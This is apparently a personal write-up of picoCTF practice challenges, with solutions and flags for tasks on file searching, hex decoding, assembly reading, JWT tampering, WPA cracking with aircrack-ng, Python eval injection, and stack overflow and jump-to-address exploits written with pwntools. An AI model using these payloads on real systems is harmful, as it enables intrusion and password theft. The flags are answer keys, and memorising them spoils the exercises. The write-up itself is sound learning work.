# PicoCTF Exclusive

Pico GYM repractice
 Starting : 12/2/2024
 Finish : 13/2/2024
 
Pending Task : 
1. Reverse Engineering - Picker III
 

## General Skill

### First Find
**Description**
Unzip this archive and find the file named 'uber-secret.txt'

Unzip the file and use gio tree 
```
┌──(sofarz㉿badboy)-[~/Desktop/CTF/Pico/Exclusive]
└─$ gio tree -h files 
file:///home/sofarz/Desktop/CTF/Pico/Exclusive/files
|-- 13771.txt.utf-8
|-- 14789.txt.utf-8
|-- acceptable_books
|   |-- 17879.txt.utf-8
|   |-- 17880.txt.utf-8
|   `-- more_books
|       `-- 40723.txt.utf-8
|-- adequate_books
|   |-- 44578.txt.utf-8
|   |-- 46804-0.txt
|   `-- more_books
|       |-- .secret
|       |   `-- deeper_secrets
|       |       `-- deepest_secrets
|       |           `-- uber-secret.txt
|       `-- 1023.txt.utf-8
`-- satisfactory_books
    |-- 16021.txt.utf-8
    |-- 23765.txt.utf-8
    `-- more_books
        `-- 37121.txt.utf-8
```
==picoCTF{f1nd_15_f457_ab443fd1}==

---
### Big Zip
**Description**
Unzip this archive and find the flag.

```┌──(sofarz㉿badboy)-[~/Desktop/CTF/Pico/Exclusive]
└─$ strings * | grep -r "pico"             
strings: Warning: 'big-zip-files' is a directory
grep: files.zip: binary file matches
big-zip-files/folder_pmbymkjcya/folder_cawigcwvgv/folder_ltdayfmktr/folder_fnpfclfyee/whzxrpivpqld.txt:information on the record will last a billion years. Genes and brains and books encode picoCTF{gr3p_15_m4g1c_ef8790dc}
```
==picoCTF{gr3p_15_m4g1c_ef8790dc}==


---

### ASCII Numbers
**Description**

Convert the following string of ASCII numbers into a readable string: 
```
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x35 0x63 0x31 0x31 0x5f 0x6e 0x30 0x5f 0x71 0x75 0x33 0x35 0x37 0x31 0x30 0x6e 0x35 0x5f 0x31 0x6c 0x6c 0x5f 0x74 0x33 0x31 0x31 0x5f 0x79 0x33 0x5f 0x6e 0x30 0x5f 0x6c 0x31 0x33 0x35 0x5f 0x34 0x34 0x35 0x64 0x34 0x31 0x38 0x30 0x7d

```
First anaylis it was hex. Convert it into ASCII.

==picoCTF{45c11_n0_qu35710n5_1ll_t311_y3_n0_l135_445d4180}==

## Web
### JAuth

**Description**
Most web application developers use third party components without testing their security. Some of the past affected companies are:

    Equifax (a US credit bureau organization) - breach due to unpatched Apache Struts web framework CVE-2017-5638
    Mossack Fonesca (Panama Papers law firm) breach - unpatched version of Drupal CMS used
    VerticalScope (internet media company) - outdated version of vBulletin forum software used

Can you identify the components and exploit the vulnerable one? The website is running here. Can you become an admin? You can login as `test` with the password `Test123!` to get started.

#### Initital Analysis
We can login user `test:Test123!` . 
Checking via cookies, it was Jason Web Token (JWT)
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzA3Njc2MzM1NDg1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6MTA5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTE1LjAiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwNzY3NjMzNX0.H-kzrFK9Qt9kamYIeLzBVC2zGWeDsETMzz_VwbJZWtA
```
![image](https://hackmd.io/_uploads/HkMsQ9Io6.png)

It also mention about past vulnerbailites where it can tampered role from `user` to `admin`.

![image](https://hackmd.io/_uploads/HJ57mcIiT.png)
At first encounter this problem, after reading the 2nd hint it mention about 2 part, after reviewing my JWT token, notice that my token only 1 part. How to make it 2 part?? (.) yes!!. separate by dot (.)

==picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}==

## RE
### ASCII FTW
**Description**
This program has constructed the flag using hex ascii values. Identify the flag text by disassembling the program. You can download the file from here.

```
        0010117e 48 89 45 f8     MOV        qword ptr [RBP + local_10],RAX
        00101182 31 c0           XOR        EAX,EAX
        00101184 c6 45 d0 70     MOV        byte ptr [RBP + local_38],0x70
        00101188 c6 45 d1 69     MOV        byte ptr [RBP + local_37],0x69
        0010118c c6 45 d2 63     MOV        byte ptr [RBP + local_36],0x63
        00101190 c6 45 d3 6f     MOV        byte ptr [RBP + local_35],0x6f
        00101194 c6 45 d4 43     MOV        byte ptr [RBP + local_34],0x43
        00101198 c6 45 d5 54     MOV        byte ptr [RBP + local_33],0x54
        0010119c c6 45 d6 46     MOV        byte ptr [RBP + local_32],0x46
        001011a0 c6 45 d7 7b     MOV        byte ptr [RBP + local_31],0x7b
        001011a4 c6 45 d8 41     MOV        byte ptr [RBP + local_30],0x41
        001011a8 c6 45 d9 53     MOV        byte ptr [RBP + local_2f],0x53
        001011ac c6 45 da 43     MOV        byte ptr [RBP + local_2e],0x43
        001011b0 c6 45 db 49     MOV        byte ptr [RBP + local_2d],0x49
        001011b4 c6 45 dc 49     MOV        byte ptr [RBP + local_2c],0x49
        001011b8 c6 45 dd 5f     MOV        byte ptr [RBP + local_2b],0x5f
        001011bc c6 45 de 49     MOV        byte ptr [RBP + local_2a],0x49
        001011c0 c6 45 df 53     MOV        byte ptr [RBP + local_29],0x53
        001011c4 c6 45 e0 5f     MOV        byte ptr [RBP + local_28],0x5f
        001011c8 c6 45 e1 45     MOV        byte ptr [RBP + local_27],0x45
        001011cc c6 45 e2 41     MOV        byte ptr [RBP + local_26],0x41
        001011d0 c6 45 e3 53     MOV        byte ptr [RBP + local_25],0x53
        001011d4 c6 45 e4 59     MOV        byte ptr [RBP + local_24],0x59
        001011d8 c6 45 e5 5f     MOV        byte ptr [RBP + local_23],0x5f
        001011dc c6 45 e6 33     MOV        byte ptr [RBP + local_22],0x33
        001011e0 c6 45 e7 43     MOV        byte ptr [RBP + local_21],0x43
        001011e4 c6 45 e8 46     MOV        byte ptr [RBP + local_20],0x46
        001011e8 c6 45 e9 34     MOV        byte ptr [RBP + local_1f],0x34
        001011ec c6 45 ea 42     MOV        byte ptr [RBP + local_1e],0x42
        001011f0 c6 45 eb 46     MOV        byte ptr [RBP + local_1d],0x46
        001011f4 c6 45 ec 41     MOV        byte ptr [RBP + local_1c],0x41
        001011f8 c6 45 ed 44     MOV        byte ptr [RBP + local_1b],0x44
        001011fc c6 45 ee 7d     MOV        byte ptr [RBP + local_1a],0x7d
        00101200 0f b6 45 d0     MOVZX      EAX,byte ptr [RBP + local_38]
        00101204 0f be c0        MOVSX      EAX,AL
        00101207 89 c6           MOV        ESI,EAX
        00101209 48 8d 3d        LEA        RDI,[s_The_flag_starts_with_%x_00102004]         = "The flag starts with %x\nf4 0d 00 00


```

By understanding how this program works and looking into ghidra, it can conclude that this assembly never been call but it contains flags.

==picoCTF{ASCII_IS_EASY_3CF4BFAD}==

---
### Bit-O-Asm-1
**Description**
Can you figure out what is in the eax register? Put your answer in the picoCTF flag format: picoCTF{n} where n is the contents of the eax register in the decimal number base. If the answer was 0x11 your flag would be picoCTF{17}. Download the assembly dump here.


```
<+0>:     endbr64 
<+4>:     push   rbp
<+5>:     mov    rbp,rsp
<+8>:     mov    DWORD PTR [rbp-0x4],edi
<+11>:    mov    QWORD PTR [rbp-0x10],rsi
<+15>:    mov    eax,0x30
<+20>:    pop    rbp
<+21>:    ret

```
The first top line was dummy since it not touch any value in **EAX**, Then `mov eax,0x30`. which mean copy value 0x30 into EAX. 
The answer is `0x30 (48)`

==picoCTF{48}==

---
### Bit-O-Asm-2
**Description**
Can you figure out what is in the eax register? Put your answer in the picoCTF flag format: picoCTF{n} where n is the contents of the eax register in the decimal number base. If the answer was 0x11 your flag would be picoCTF{17}. Download the assembly dump here.

```
<+0>:     endbr64 
<+4>:     push   rbp
<+5>:     mov    rbp,rsp
<+8>:     mov    DWORD PTR [rbp-0x14],edi
<+11>:    mov    QWORD PTR [rbp-0x20],rsi
<+15>:    mov    DWORD PTR [rbp-0x4],0x9fe1a
<+22>:    mov    eax,DWORD PTR [rbp-0x4]
<+25>:    pop    rbp
<+26>:    ret

```
Same as previous, but this time it refer to `[rbp-0x4]`. Refer to line 15, it copy the value 0x9fe1a(654874).

==picoCTF{654874}==

---
### Bit-O-Asm-3
**Description**
Can you figure out what is in the eax register? Put your answer in the picoCTF flag format: picoCTF{n} where n is the contents of the eax register in the decimal number base. If the answer was 0x11 your flag would be picoCTF{17}. Download the assembly dump here.

```
<+0>:     endbr64 
<+4>:     push   rbp
<+5>:     mov    rbp,rsp
<+8>:     mov    DWORD PTR [rbp-0x14],edi
<+11>:    mov    QWORD PTR [rbp-0x20],rsi
<+15>:    mov    DWORD PTR [rbp-0xc],0x9fe1a
<+22>:    mov    DWORD PTR [rbp-0x8],0x4
<+29>:    mov    eax,DWORD PTR [rbp-0xc]
<+32>:    imul   eax,DWORD PTR [rbp-0x8]
<+36>:    add    eax,0x1f5
<+41>:    mov    DWORD PTR [rbp-0x4],eax
<+44>:    mov    eax,DWORD PTR [rbp-0x4]
<+47>:    pop    rbp
<+48>:    ret
```

Focus on line 14,22,29,32,36
```
eax = 0x9fe1a
imul eax, 0x4
add eax,0x1f5

eax = (0x9fe1a * 0x4) + 0x1f5
```

==picoCTF{2619997}==


---
### Bit-O-Asm-4
**Description**
Can you figure out what is in the eax register? Put your answer in the picoCTF flag format: picoCTF{n} where n is the contents of the eax register in the decimal number base. If the answer was 0x11 your flag would be picoCTF{17}. Download the assembly dump here.

```
<+0>:     endbr64 
<+4>:     push   rbp
<+5>:     mov    rbp,rsp
<+8>:     mov    DWORD PTR [rbp-0x14],edi
<+11>:    mov    QWORD PTR [rbp-0x20],rsi
<+15>:    mov    DWORD PTR [rbp-0x4],0x9fe1a
<+22>:    cmp    DWORD PTR [rbp-0x4],0x2710
<+29>:    jle    0x55555555514e <main+37>
<+31>:    sub    DWORD PTR [rbp-0x4],0x65
<+35>:    jmp    0x555555555152 <main+41>
<+37>:    add    DWORD PTR [rbp-0x4],0x65
<+41>:    mov    eax,DWORD PTR [rbp-0x4]
<+44>:    pop    rbp
<+45>:    ret
```
This time it include comparism between value.
```
rbp-0x4 = 0x9fe1a
cmp = mean compare, (0x9fe1a <operator> 0x2710)
operator = jle (<=)
(0x9fe1a <= 0x2710)
if true sub with 0x65
else add with 0x65

It return true then the subtration operation happen.
```

==picoCTF{654773}==

---

### Picker I
**Description**
This service can provide you with a random number, but can it do anything else? Connect to the program with netcat: $ nc saturn.picoctf.net 55986 The program's source code can be downloaded here.

```
while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
  except Exception as e:
    print(e)
```
This code are vulnerable where it use eval(). Looking into win() and that is our target.

```
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4
Try entering "getRandomNumber" without the double quotes...
==> win
[Errno 2] No such file or directory: 'flag.txt'
Try entering "getRandomNumber" without the double quotes...
==> print(open('flag.txt', 'r').read())
[Errno 2] No such file or directory: 'flag.txt'

```

Simple script,
```
from pwn import *

r = remote('saturn.picoctf.net', 55986)

r.sendlineafter('quotes...',b'win')
get = r.interactive()
```

==picoCTF{4_d14m0nd_1n_7h3_r0ugh_b523b2a1}==

---
### Picker II
**Description**
Can you figure out how this program works to get the flag?

```
def filter(user_input):
  if 'win' in user_input:
    return False
  return True


while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
```

Same as picker-I, but this time the word WIN being filter. Bypass the function win by calling directly the flag.
```
print(open('flag.txt', 'r').read())
```

==picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}==

---
### Picker III
**Description**
Can you figure out how this program works to get the flag?

```
def reset_table():
  global func_table

  # This table is formatted for easier viewing, but it is really one line
  func_table = \
\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
---Snippet---

def read_variable():
  var_name = input('Please enter variable name to read: ')
  if( filter_var_name(var_name) ):
    eval('print('+var_name+')')
  else:
    print('Illegal variable name')


def filter_value(value):
  if ';' in value or '(' in value or ')' in value:
    return False
  else:
    return True


def write_variable():
  var_name = input('Please enter variable name to write: ')
  if( filter_var_name(var_name) ):
    value = input('Please enter new value of variable: ')
    if( filter_value(value) ):
      exec('global '+var_name+'; '+var_name+' = '+value)
    else:
      print('Illegal value')
  else:
    print('Illegal variable name')
```
From what can conclude, we cannot put previous payload since it to long. But there is some bug that i can use where create a new variable and run the variable.

```
IDEA
3 -> to create variable
win -> name it (can be anything)
open('flag.txt', 'r').read() -> need to modify since filtered.
"open" + "\x28" + "\"flag.txt\"" + "," + "\"r\"" + "\x29" + ".read" + "\x28" + "\x29"

2 -> to read variable
win -> our created variable.
```
That is how it will work, but im stucking in displaying the flag.
```
 python3 picker-III.py
==> 3
Please enter variable name to write: win
Please enter new value of variable: "open" + "\x28" + "\"flag.txt\"" + "," + "\"r\"" + "\x29" + ".read" + "\x28" + "\x29"
==> 2
Please enter variable name to read: win
open("flag.txt","r").read()

```
**TODO**


---

### GDB baby step 1
**Description**
Can you figure out what is in the eax register at the end of the main function? Put your answer in the picoCTF flag format: picoCTF{n} where n is the contents of the eax register in the decimal number base. If the answer was 0x11 your flag would be picoCTF{17}. Disassemble this.

```
0x555555555131 <main+8>                        mov    dword ptr [rbp - 4], edi
   0x555555555134 <main+11>                       mov    qword ptr [rbp - 0x10], rsi
   0x555555555138 <main+15>                       mov    eax, 0x86342
   0x55555555513d <main+20>                       pop    rbp
```

Checking into dissamble, the value 0x86342 being pass into eax.

==picoCTF{549698}==

### GDB Baby Step 2

```
 ndbg> disass main
Dump of assembler code for function main:
   0x0000000000401106 <+0>:     endbr64
   0x000000000040110a <+4>:     push   rbp
   0x000000000040110b <+5>:     mov    rbp,rsp
=> 0x000000000040110e <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x0000000000401111 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
   0x0000000000401115 <+15>:    mov    DWORD PTR [rbp-0x4],0x1e0da
   0x000000000040111c <+22>:    mov    DWORD PTR [rbp-0xc],0x25f
   0x0000000000401123 <+29>:    mov    DWORD PTR [rbp-0x8],0x0
   0x000000000040112a <+36>:    jmp    0x401136 <main+48>
   0x000000000040112c <+38>:    mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040112f <+41>:    add    DWORD PTR [rbp-0x4],eax
   0x0000000000401132 <+44>:    add    DWORD PTR [rbp-0x8],0x1
   0x0000000000401136 <+48>:    mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000401139 <+51>:    cmp    eax,DWORD PTR [rbp-0xc]
   0x000000000040113c <+54>:    jl     0x40112c <main+38>
   0x000000000040113e <+56>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000401141 <+59>:    pop    rbp

```
Simple words, open the gdb and set into Intel.
```
set disassembly-flavor intel
break main
layout asm
r
break *0x401142
c
print/d $eax
```

==picoCTF{307019}==

## Forensics
### WPA-ing Out
**Description**
I thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the rockyou.txt credential dump. Use this 'pcap file' and the rockyou wordlist. The flag should be entered in the picoCTF{XXXXXX} format.

#### Initial Analysis
Open the pcap file and we notice protocol 802.11 which mean this is networking (Wi-Fi). 
![image](https://hackmd.io/_uploads/SJBdI5Lip.png)

The challenge mention about password and wireless. We can use aircrack-ng to crack the password.
`aircrack-ng wpa-ing_out.pcap -w /usr/share/wordlists/rockyou.txt
`

==picoCTF{mickeymouse}==

## Binary/Pwn
### Local Target
**Description**
Smash the stack
Can you overflow the buffer and modify the other local variable? The program is available here. You can view source here. And connect with it using: nc saturn.picoctf.net 57499

#### Initial Analysis
```
char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
```
There was a condition to meet where the num need to be 65. But there was no input/call for variable num. Only have input for strings.
1. Exploit directly using 16 + 8(since this 64 byte) = 24 char 
```
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAA\x41' | ./local-target
-- A contains of 24 bit. Which mean we already at stack. Then push /41(65) value into stack, that will call num = 65.
```
2. Using GDB (still new to me)
```
Launch using GDB
cylic 100
run + put cyclic value
cyclic -l RIP
cyclic -l (RBP)

For this we nee to use RBP since the flag call in main function. Still in the same stack. 
```
```
Payload
from pwn import * 
import os 

#io = remote('saturn.picoctf.net', 64428)
io = process('./local-target')



# Padding is offset - 8 bytes.
padding = 24

p = flat([
    asm('nop') * padding,
    0x41 # send value 65 here.
])

io.sendlineafter(b':', p)
io.interactive()

```

![image](https://hackmd.io/_uploads/ryo0MoIip.png)
==picoCTF{l0c4l5_1n_5c0p3_fee8ef05}==


---

### Picker IV
**Description**
Can you figure out how this program works to get the flag? Connect to the program with netcat: $ nc saturn.picoctf.net 63096 The program's source code can be downloaded here. The binary can be downloaded here.

```
 Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
The PIE is unable which mean the memory address will be fix everytime program run.

Checking the source code
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }
--snippet--

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

```
Got 2 function name as **main** and **win**. Briefly checking the main function, we known that we need to specifically enter address to jump/call.

It was direct and can be done using objdump
`objdump -d picker-IV| grep win `

Supply the address to the input.
```
./picker-IV                   
Enter the address in hex to jump to, excluding '0x': 0x40129e                              
You input 0x40129e
```

Using GDB
```
pwndbg> info functions win
All functions matching regular expression "win":

Non-debugging symbols:
0x000000000040129e  win

```

Payload will look like 
```
from pwn import * 

#r = remote('',)
r = process("./picker-IV")

# 0x000000000040129e
win = b'40129e'

r.sendlineafter("'0x': ",win)
r.interactive()


```

==picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}==

## Resources
1. Tools -
[hex](https://onlinetools.com/hex/convert-hex-to-ascii)
[JWT](https://token.dev)

